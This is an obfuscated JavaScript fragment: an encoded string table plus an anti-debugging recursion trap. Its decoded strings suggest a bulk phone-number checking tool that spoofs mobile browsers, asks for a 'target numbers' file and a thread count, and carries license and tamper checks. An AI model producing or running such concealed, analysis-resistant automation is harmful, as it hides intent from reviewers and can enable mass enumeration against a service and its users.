'BgLNAhq', 'icdINjmGvgHYzwfKCYa6ia', 'Ahr0Chm6', 'tw96AwXSys81lJaGkeXPBNv4oYbvoYbbBMrYB2LKia', 'y2fYzwvYCY53zxHPBMmUy29T', 'sgfYCMLZ', 'mtyUms4X', 'rg9UBMe', 'zM9Jr1q', 'BhrUCLa', 's2vpzu4', 'yw5KCM9Pza', 'rw50zxiGy3vZDg9Tig51BwjLCIbVzIb0AhjLywrZifSXlteWxtO', 'zgv2AwnL', 'yLjuqxC', 'zNvUy3rPB24GkLWOicPCkq', 'zg93BG', 'jNbFBgfUzYuZrgvUx3vZjNjLzK51BsuZrfDfwfDfwfvt', 'v2LUzg93CYbfzgDLia', 'CMvHzezPBgvtEw5J', 'DgHIAuW', 'tfbttKW', 'rhDlz2C', 'v0vyv0vyvvm', 'Ahr0CdOVlW', 'D2v4', 'B0j3yM0', 'tw9VCMu', 's2f0AgXLzw4', 'sMfZB24', 'tNjmBLi', 'DxbKyxrL', 'odi2ngffuu1cta', 'Aw5JBhvKzxm', 'se9cBNq', 'Au9tifnHzMfYAsaO', 'C2vJlwnOlxvHlxbSyxrMB3jT', 'BM93', 'ie1VyMLSzs8XnuuXndGGu2fMyxjPlZyWnc4X', 'mtzFnq', 'ihjHBMrVBsbUDw1IzxjZ', '4PscicbgywLSzwqGidOG', 't0DNC3i', 'ugHVzw5PEa', 'zgn4D0e', 'z3PPCcWGzgvMBgf0zsWGyNi', 'ww5Qt0y', 'ALLZzxy', 'ndi0', 'lJaGtw9IAwXLlZe1rte0ocbtywzHCMKVnJa0lJe', 'rgfSBgfZ', 'qLbqu1G', 'tgvL', 'u2jMt0C', 'mJy3', 'mJeY', 'DfDozw4', 'mJiXmdeZmKC', 'cIaG4PYxieHxsuqGAw50zwDYAxr5ignOzwnRigzHAwXLzc4GvgfTCgvYAw5NigrLDgvJDgvKlGO', 'AvbOB25LideYifbYBYbnyxG', '4PscifVIGkjDifzLCNnPB24Gica6ia', 'yNjHBMq', 'DMfSDwu', 'AvbOB25LideX', 'uLjXALi', 'CMvHzgXPBMu', 'vw5RBM93BKnqvq', 'iKfUzhjVAwqI', 'AvbOB25LmtqSmG', 'yxbWBgLJyxrPB24VANnVBG', 'DgLTzxn0yw1W', 'C29JA3mTChjVEhKTywDLBNq', 'C2vJlwzLDgnOlxnPDgu', 'CgfNzvn0yxj0vgLTzq', 'u21PDgG', 'z2v0vvrdrgf0zq', 'iZaWmZa4nW', 'nZm3', 'ms4WlJa', 'Cgf0Ag5HBwu', 'B2niy04', 'zePOwNO', 'rgvIB3jHAa', 'Bw9KzwW', 'B3jPz2LUywW', 'C29JA3m0', 'CgXHDgzVCM0', 's2XMDgq', 'oYbnB2jPBgu7ihj2oG', 'C01pAwC', 'rMLYzwzVEcbbBMrYB2LKia', 'tgv3Axm', 'wuPPv3y', 'twfPBMu', 'CxHRrw8', 'icdINjmGvgfZA3mGica6ia', 'yxnKC2e', 'mtDFm18X', 'twfZC2fJAhvZzxr0CW', 'vfaXqs4YmJa2mJqUmdiX', 'CMvHC29U', 'nJC4', 'C3rHDgvpyMPLy3q', 'Ahr0Chm', 'EuvNuMK', 'y29VA2LL', 'Bg9JyxrPB24', 'CMfUzg9TqNL0zxm', 'l2fWAs92zxjPzNK', 'cIaG4PYxieXPy2vUC2uGC2vYDMvYigLZign1CNjLBNrSEsb1BMrLCMDVAw5Nig1HAw50zw5HBMnLig9YigLZihvUCMvHy2HHyMXLlG', 'AKvKz1C', 'CLjlq3G', 'CgPPzcuZra', 'zNzODNy', 'Dhj1zq', 'twf0DgHLDW', 'vwDkz1q', 'twfYA2v0Aw5Nl0j1C2LUzxnZierLDMvSB3bTzw50', 'v0HLww8', 'C3rHCNruAw1L', 'zMfPBgvKlNr4Da', 'zM9YrwfJAa', 'EwztCeK', 'tgLUzge', 'mtyUnI4X', 'ugz4ugG', 'y0fswgO', 'icdINjmGuhjVEgLLCYa6ia', 'B1nAzLa', 'AvbOB25LideY', 'mZeY', 'ywrKAxrPB25HBef0DgfJAg1LBNrZ', 'q2fYDgvY', 'ANfWrgG', 'EurushO', 'yxnZAwDU', 'ywnJzxb0lwXHBMD1ywDL', 'u2fTC3vUzYbjBNrLCM5LDca', 'v3HkC3q', 'DhjHAxqYoa', 'AfPLzwm', 'CxnAwve', 'u00Tqtu1nKi', 'yuXhDeK', 'cIaG4PYxieLUDgvYBMfSifnLCNzLCIbfCNjVCIaOntaWks4GugXLyxnLihrYEsbHz2fPBIbSyxrLCI4k', 'ote3', 'y3DK', 'zwrNzq', 'mJDYzgXlqNO', 'txzRBwq', 'C2v0uMf3tw9Kzq', 'tgf1CMe', 't1bqtW', 'qw50Ag9UEq', 'nJe3', 'AwnSB3vKlMnVBq', 'vgLtBxe', 'jNzLCNnPB249mJaYnteWlJeUmczICM93C2vYr3bJrMXHzZ0WjMLZsufcr2XVyMfSpwzHBhnLjMHVC3rZpszJB25Zzw50swq9', 'icaG4PwA4Pwq4Pwq4PwD4PwA4Pwq4Pwq4PwDiokvMUkvKokvKokvKokvKokvKokvKokvNEkvMUkvKokvNsaG4PwA4Pwq4PwDcG', 'wfeTrfe3mG', 'qxrpCvu', 'y3b1CW', 'zNjVBq', 'tg9HzgvKia', 'rw50zxiGtNvTyMvYCYbgAwXLifbHDgG6', 'zgvIDq', 'r3jLzw4', 'yLvKqKy', 't3b0yw5VBKnVBNnLBNq', 't3b0yw5VBKfSzxj0qM94q2XVC2vK', 'sLrd', 'CuPNv1i', 'CMvWzwf0', '4PscicbpDxrWDxqGidOG', 'weTsrxy', 'CgfKrw5K', 'mJGX', 'DLngB3e', 'AvbOB25LmtqSnq', 'g1SYsHTBsa', 't0Pzsu8', 'mtzFnf8X', 'uuTXq2S', 'u2fUy2HLEG', 'wNrysxm', 'CxL5Bxq', 'vdnuqZmZlJe4ltq4', 'zw1HAwW', 'AhDPza', 'Aw5PDgLHBfjLzMvYCMfS', 'mtCUmG', 'mtaGvgHYzwfKCYaOrxH0CMvTzsK', 'qvnvu19bsti0mdfFra', 'sgvYBMfUzgv6', 'BwfUDwfS', 'r3jNwxi', 'r3Drr0u', 'mtCUms4Y', 'AxnuvfK', 'C3rVCMu', 'i0zgrdCWma', 'ywDLBNq', 'u0vmrunuifrbuKDfvcbovu1crvjtiezjteu', 'AvbOB25Lide1ifbYBW', 'cIaG4PYxifvWzgf0zsbYzxf1AxjLzceGugXLyxnLigrVD25SB2fKihrOzsbSyxrLC3qGDMvYC2LVBI4k', 'CKPHEgu', 'swPlqu4', 'uujrquO', 'ExDZrxy', 'vvaXqs4YmZeWmduUmda3', 'vJiYnta', 'yMfZzw5HBwu', 'DhLWzq', 'u2fSzxm', 'AvbOB25LmtmSmG', 'g1SWBsa', 'y01Hr3y'];
  fn1 = function () {
    return v424;
  };
  return fn1();
}
function fn2(v425) {
  function fn8(v426) {
    fn8(++v426);
  }
  try {
    if (v425) return fn8;else fn8(0x0);
  } catch (v427) {}
}